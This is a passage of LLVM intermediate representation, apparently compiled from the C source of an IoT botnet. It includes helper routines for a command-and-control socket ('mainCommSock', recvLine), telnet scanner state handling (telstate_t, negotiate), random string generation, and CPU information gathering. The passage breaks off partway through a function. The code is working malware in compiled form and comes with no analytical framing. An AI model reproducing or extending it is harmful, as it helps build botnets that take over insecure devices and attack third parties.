  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 noundef %28, i8* noundef %32, i64 noundef 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %8, align 4
  br label %9, !llvm.loop !20

37:                                               ; preds = %25
  %38 = load i32, i32* %7, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %37
  br label %43

41:                                               ; preds = %37
  %42 = load i8*, i8** %4, align 8
  br label %43

43:                                               ; preds = %41, %40
  %44 = phi i8* [ null, %40 ], [ %42, %41 ]
  ret i8* %44
}

declare i64 @read(i32 noundef, i8* noundef, i64 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i64 @parseHex(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

4:                                                ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

9:                                                ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

12:                                               ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %24

14:                                               ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = or i64 %16, %22
  store i64 %23, i64* %3, align 8
  br label %4, !llvm.loop !21

24:                                               ; preds = %12
  %25 = load i64, i64* %3, align 8
  ret i64 %25
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @wildString(i8* noundef %0, i8* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %54 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %37
  ]

9:                                                ; preds = %2
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %3, align 4
  br label %76

13:                                               ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* noundef %15, i8* noundef %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %31

24:                                               ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* noundef %25, i8* noundef %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  br label %31

31:                                               ; preds = %24, %19
  %32 = phi i1 [ false, %19 ], [ %30, %24 ]
  br label %33

33:                                               ; preds = %31, %13
  %34 = phi i1 [ true, %13 ], [ %32, %31 ]
  %35 = xor i1 %34, true
  %36 = zext i1 %35 to i32
  store i32 %36, i32* %3, align 4
  br label %76

37:                                               ; preds = %2
  %38 = load i8*, i8** %5, align 8
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %50

42:                                               ; preds = %37
  %43 = load i8*, i8** %4, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8*, i8** %5, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = call i32 @wildString(i8* noundef %44, i8* noundef %46)
  %48 = icmp ne i32 %47, 0
  %49 = xor i1 %48, true
  br label %50

50:                                               ; preds = %42, %37
  %51 = phi i1 [ false, %37 ], [ %49, %42 ]
  %52 = xor i1 %51, true
  %53 = zext i1 %52 to i32
  store i32 %53, i32* %3, align 4
  br label %76

54:                                               ; preds = %2
  %55 = load i8*, i8** %4, align 8
  %56 = load i8, i8* %55, align 1
  %57 = zext i8 %56 to i32
  %58 = call i32 @toupper(i32 noundef %57) #11
  %59 = load i8*, i8** %5, align 8
  %60 = load i8, i8* %59, align 1
  %61 = zext i8 %60 to i32
  %62 = call i32 @toupper(i32 noundef %61) #11
  %63 = icmp eq i32 %58, %62
  br i1 %63, label %64, label %72

64:                                               ; preds = %54
  %65 = load i8*, i8** %4, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 1
  %67 = load i8*, i8** %5, align 8
  %68 = getelementptr inbounds i8, i8* %67, i64 1
  %69 = call i32 @wildString(i8* noundef %66, i8* noundef %68)
  %70 = icmp ne i32 %69, 0
  %71 = xor i1 %70, true
  br label %72

72:                                               ; preds = %64, %54
  %73 = phi i1 [ false, %54 ], [ %71, %64 ]
  %74 = xor i1 %73, true
  %75 = zext i1 %74 to i32
  store i32 %75, i32* %3, align 4
  br label %76

76:                                               ; preds = %72, %50, %33, %9
  %77 = load i32, i32* %3, align 4
  ret i32 %77
}

; Function Attrs: nounwind readonly willreturn
declare i32 @toupper(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getHost(i8* noundef %0, %struct.in_addr* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* noundef %7) #12
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

12:                                               ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

13:                                               ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

14:                                               ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @uppercase(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  br label %3

3:                                                ; preds = %7, %1
  %4 = load i8*, i8** %2, align 8
  %5 = load i8, i8* %4, align 1
  %6 = icmp ne i8 %5, 0
  br i1 %6, label %7, label %16

7:                                                ; preds = %3
  %8 = load i8*, i8** %2, align 8
  %9 = load i8, i8* %8, align 1
  %10 = zext i8 %9 to i32
  %11 = call i32 @toupper(i32 noundef %10) #11
  %12 = trunc i32 %11 to i8
  %13 = load i8*, i8** %2, align 8
  store i8 %12, i8* %13, align 1
  %14 = load i8*, i8** %2, align 8
  %15 = getelementptr inbounds i8, i8* %14, i32 1
  store i8* %15, i8** %2, align 8
  br label %3, !llvm.loop !22

16:                                               ; preds = %3
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getBogos(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca i8*, align 8
  store i8* %0, i8** %3, align 8
  %7 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i64 0, i64 0), i32 noundef 0)
  store i32 %7, i32* %4, align 4
  br label %8

8:                                                ; preds = %82, %1
  %9 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %10 = load i32, i32* %4, align 4
  %11 = call i8* @fdgets(i8* noundef %9, i32 noundef 4096, i32 noundef %10)
  %12 = icmp ne i8* %11, null
  br i1 %12, label %13, label %84

13:                                               ; preds = %8
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @uppercase(i8* noundef %14)
  %15 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %16 = call i8* @strstr(i8* noundef %15, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i64 0, i64 0)) #11
  %17 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %18 = icmp eq i8* %16, %17
  br i1 %18, label %19, label %82

19:                                               ; preds = %13
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 8
  store i8* %21, i8** %6, align 8
  br label %22

22:                                               ; preds = %39, %19
  %23 = load i8*, i8** %6, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 32
  br i1 %26, label %37, label %27

27:                                               ; preds = %22
  %28 = load i8*, i8** %6, align 8
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i32
  %31 = icmp eq i32 %30, 9
  br i1 %31, label %37, label %32

32:                                               ; preds = %27
  %33 = load i8*, i8** %6, align 8
  %34 = load i8, i8* %33, align 1
  %35 = zext i8 %34 to i32
  %36 = icmp eq i32 %35, 58
  br label %37

37:                                               ; preds = %32, %27, %22
  %38 = phi i1 [ true, %27 ], [ true, %22 ], [ %36, %32 ]
  br i1 %38, label %39, label %42

39:                                               ; preds = %37
  %40 = load i8*, i8** %6, align 8
  %41 = getelementptr inbounds i8, i8* %40, i32 1
  store i8* %41, i8** %6, align 8
  br label %22, !llvm.loop !23

42:                                               ; preds = %37
  br label %43

43:                                               ; preds = %63, %42
  %44 = load i8*, i8** %6, align 8
  %45 = load i8*, i8** %6, align 8
  %46 = call i64 @strlen(i8* noundef %45) #11
  %47 = sub i64 %46, 1
  %48 = getelementptr inbounds i8, i8* %44, i64 %47
  %49 = load i8, i8* %48, align 1
  %50 = zext i8 %49 to i32
  %51 = icmp eq i32 %50, 13
  br i1 %51, label %61, label %52

52:                                               ; preds = %43
  %53 = load i8*, i8** %6, align 8
  %54 = load i8*, i8** %6, align 8
  %55 = call i64 @strlen(i8* noundef %54) #11
  %56 = sub i64 %55, 1
  %57 = getelementptr inbounds i8, i8* %53, i64 %56
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 10
  br label %61

61:                                               ; preds = %52, %43
  %62 = phi i1 [ true, %43 ], [ %60, %52 ]
  br i1 %62, label %63, label %69

63:                                               ; preds = %61
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* noundef %65) #11
  %67 = sub i64 %66, 1
  %68 = getelementptr inbounds i8, i8* %64, i64 %67
  store i8 0, i8* %68, align 1
  br label %43, !llvm.loop !24

69:                                               ; preds = %61
  %70 = load i8*, i8** %6, align 8
  %71 = call i8* @strchr(i8* noundef %70, i32 noundef 46) #11
  %72 = icmp ne i8* %71, null
  br i1 %72, label %73, label %76

73:                                               ; preds = %69
  %74 = load i8*, i8** %6, align 8
  %75 = call i8* @strchr(i8* noundef %74, i32 noundef 46) #11
  store i8 0, i8* %75, align 1
  br label %76

76:                                               ; preds = %73, %69
  %77 = load i8*, i8** %3, align 8
  %78 = load i8*, i8** %6, align 8
  %79 = call i8* @strcpy(i8* noundef %77, i8* noundef %78) #12
  %80 = load i32, i32* %4, align 4
  %81 = call i32 @close(i32 noundef %80)
  store i32 0, i32* %2, align 4
  br label %87

82:                                               ; preds = %13
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %83, i8 0, i64 4096, i1 false)
  br label %8, !llvm.loop !25

84:                                               ; preds = %8
  %85 = load i32, i32* %4, align 4
  %86 = call i32 @close(i32 noundef %85)
  store i32 1, i32* %2, align 4
  br label %87

87:                                               ; preds = %84, %76
  %88 = load i32, i32* %2, align 4
  ret i32 %88
}

declare i32 @open(i8* noundef, i32 noundef, ...) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8* noundef, i8* noundef) #1

; Function Attrs: nounwind readonly willreturn
declare i8* @strchr(i8* noundef, i32 noundef) #1

; Function Attrs: nounwind
declare i8* @strcpy(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getCores() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca [4096 x i8], align 16
  store i32 0, i32* %1, align 4
  %4 = call i32 (i8*, i32, ...) @open(i8* noundef getelementptr inbounds ([14 x i8], [14 x i8]* @.str.307, i64 0, i64 0), i32 noundef 0)
  store i32 %4, i32* %2, align 4
  br label %5

5:                                                ; preds = %19, %0
  %6 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %7 = load i32, i32* %2, align 4
  %8 = call i8* @fdgets(i8* noundef %6, i32 noundef 4096, i32 noundef %7)
  %9 = icmp ne i8* %8, null
  br i1 %9, label %10, label %21

10:                                               ; preds = %5
  %11 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @uppercase(i8* noundef %11)
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %13 = call i8* @strstr(i8* noundef %12, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.308, i64 0, i64 0)) #11
  %14 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  %15 = icmp eq i8* %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %10
  %17 = load i32, i32* %1, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* %1, align 4
  br label %19

19:                                               ; preds = %16, %10
  %20 = getelementptr inbounds [4096 x i8], [4096 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %20, i8 0, i64 4096, i1 false)
  br label %5, !llvm.loop !26

21:                                               ; preds = %5
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @close(i32 noundef %22)
  %24 = load i32, i32* %1, align 4
  ret i32 %24
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomStr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !27

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @recvLine(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.__sigset_t, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.__sigset_t*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.__sigset_t*, align 8
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %19, i8 0, i64 %21, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

24:                                               ; preds = %3
  store %struct.__sigset_t* %8, %struct.__sigset_t** %11, align 8
  store i32 0, i32* %10, align 4
  br label %25

25:                                               ; preds = %35, %24
  %26 = load i32, i32* %10, align 4
  %27 = zext i32 %26 to i64
  %28 = icmp ult i64 %27, 16
  br i1 %28, label %29, label %38

29:                                               ; preds = %25
  %30 = load %struct.__sigset_t*, %struct.__sigset_t** %11, align 8
  %31 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %30, i32 0, i32 0
  %32 = load i32, i32* %10, align 4
  %33 = zext i32 %32 to i64
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %31, i64 0, i64 %33
  store i64 0, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %10, align 4
  %37 = add i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %25, !llvm.loop !28

38:                                               ; preds = %25
  br label %39

39:                                               ; preds = %38
  %40 = load i32, i32* %5, align 4
  %41 = srem i32 %40, 64
  %42 = zext i32 %41 to i64
  %43 = shl i64 1, %42
  %44 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %45 = load i32, i32* %5, align 4
  %46 = sdiv i32 %45, 64
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds [16 x i64], [16 x i64]* %44, i64 0, i64 %47
  %49 = load i64, i64* %48, align 8
  %50 = or i64 %49, %43
  store i64 %50, i64* %48, align 8
  %51 = load i32, i32* %5, align 4
  %52 = add nsw i32 %51, 1
  %53 = call i32 @select(i32 noundef %52, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %53, i32* %12, align 4
  %54 = icmp sle i32 %53, 0
  br i1 %54, label %55, label %100

55:                                               ; preds = %39
  br label %56

56:                                               ; preds = %95, %55
  %57 = load i32, i32* %13, align 4
  %58 = icmp slt i32 %57, 10
  br i1 %58, label %59, label %99

59:                                               ; preds = %56
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %60, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.309, i64 0, i64 0))
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %62, align 8
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %63, align 8
  br label %64

64:                                               ; preds = %59
  store %struct.__sigset_t* %8, %struct.__sigset_t** %15, align 8
  store i32 0, i32* %14, align 4
  br label %65

65:                                               ; preds = %75, %64
  %66 = load i32, i32* %14, align 4
  %67 = zext i32 %66 to i64
  %68 = icmp ult i64 %67, 16
  br i1 %68, label %69, label %78

69:                                               ; preds = %65
  %70 = load %struct.__sigset_t*, %struct.__sigset_t** %15, align 8
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %70, i32 0, i32 0
  %72 = load i32, i32* %14, align 4
  %73 = zext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %73
  store i64 0, i64* %74, align 8
  br label %75

75:                                               ; preds = %69
  %76 = load i32, i32* %14, align 4
  %77 = add i32 %76, 1
  store i32 %77, i32* %14, align 4
  br label %65, !llvm.loop !29

78:                                               ; preds = %65
  br label %79

79:                                               ; preds = %78
  %80 = load i32, i32* %5, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %85 = load i32, i32* %5, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %5, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 noundef %92, %struct.__sigset_t* noundef %8, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %8, %struct.timeval* noundef %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %98

95:                                               ; preds = %79
  %96 = load i32, i32* %13, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %13, align 4
  br label %56, !llvm.loop !30

98:                                               ; preds = %79
  br label %99

99:                                               ; preds = %98, %56
  br label %100

100:                                              ; preds = %99, %39
  store i32 0, i32* %18, align 4
  %101 = load i8*, i8** %6, align 8
  store i8* %101, i8** %17, align 8
  br label %102

102:                                              ; preds = %120, %100
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, -1
  store i32 %104, i32* %7, align 4
  %105 = icmp sgt i32 %103, 1
  br i1 %105, label %106, label %123

106:                                              ; preds = %102
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i64 @recv(i32 noundef %107, i8* noundef %16, i64 noundef 1, i32 noundef 0)
  %109 = icmp ne i64 %108, 1
  br i1 %109, label %110, label %112

110:                                              ; preds = %106
  %111 = load i8*, i8** %17, align 8
  store i8 0, i8* %111, align 1
  store i32 -1, i32* %4, align 4
  br label %126

112:                                              ; preds = %106
  %113 = load i8, i8* %16, align 1
  %114 = load i8*, i8** %17, align 8
  %115 = getelementptr inbounds i8, i8* %114, i32 1
  store i8* %115, i8** %17, align 8
  store i8 %113, i8* %114, align 1
  %116 = load i8, i8* %16, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 10
  br i1 %118, label %119, label %120

119:                                              ; preds = %112
  br label %123

120:                                              ; preds = %112
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %18, align 4
  br label %102, !llvm.loop !31

123:                                              ; preds = %119, %102
  %124 = load i8*, i8** %17, align 8
  store i8 0, i8* %124, align 1
  %125 = load i32, i32* %18, align 4
  store i32 %125, i32* %4, align 4
  br label %126

126:                                              ; preds = %123, %110
  %127 = load i32, i32* %4, align 4
  ret i32 %127
}

declare i32 @select(i32 noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.__sigset_t* noundef, %struct.timeval* noundef) #3

declare i64 @recv(i32 noundef, i8* noundef, i64 noundef, i32 noundef) #3

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @get_telstate_host(%struct.telstate_t* noundef %0) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #12
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @advance_telstate(%struct.telstate_t* noundef %0, i32 noundef %1) #0 {
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %7, label %12

7:                                                ; preds = %2
  %8 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %8, i32 0, i32 0
  %10 = load i32, i32* %9, align 8
  %11 = call i32 @close(i32 noundef %10)
  br label %12

12:                                               ; preds = %7, %2
  %13 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %14 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %13, i32 0, i32 7
  store i32 0, i32* %14, align 8
  %15 = load i32, i32* %4, align 4
  %16 = trunc i32 %15 to i8
  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %21, i8 0, i64 1024, i1 false)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @negotiate(i32 noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %63 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

13:                                               ; preds = %3
  store i32 0, i32* %4, align 4
  br label %65

14:                                               ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 noundef %15, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

22:                                               ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %56

23:                                               ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

29:                                               ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %55

30:                                               ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %45

36:                                               ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = zext i1 %41 to i64
  %43 = select i1 %41, i32 251, i32 253
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %8, align 1
  br label %54

45:                                               ; preds = %30
  %46 = load i8*, i8** %6, align 8
  %47 = getelementptr inbounds i8, i8* %46, i64 1
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 253
  %51 = zext i1 %50 to i64
  %52 = select i1 %50, i32 252, i32 254
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %8, align 1
  br label %54

54:                                               ; preds = %45, %36
  br label %55

55:                                               ; preds = %54, %29
  br label %56

56:                                               ; preds = %55, %22
  %57 = load i32, i32* %5, align 4
  %58 = call i64 @send(i32 noundef %57, i8* noundef %8, i64 noundef 1, i32 noundef 16384)
  %59 = load i32, i32* %5, align 4
  %60 = load i8*, i8** %6, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 2
  %62 = call i64 @send(i32 noundef %59, i8* noundef %61, i64 noundef 1, i32 noundef 16384)
  br label %64

63:                                               ; preds = %3
  br label %64

64:                                               ; preds = %63, %56
  store i32 0, i32* %4, align 4
  br label %65

65:                                               ; preds = %64, %13
  %66 = load i32, i32* %4, align 4
  ret i32 %66
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @contains_string(i8* noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

8:                                                ; preds = %16, %2
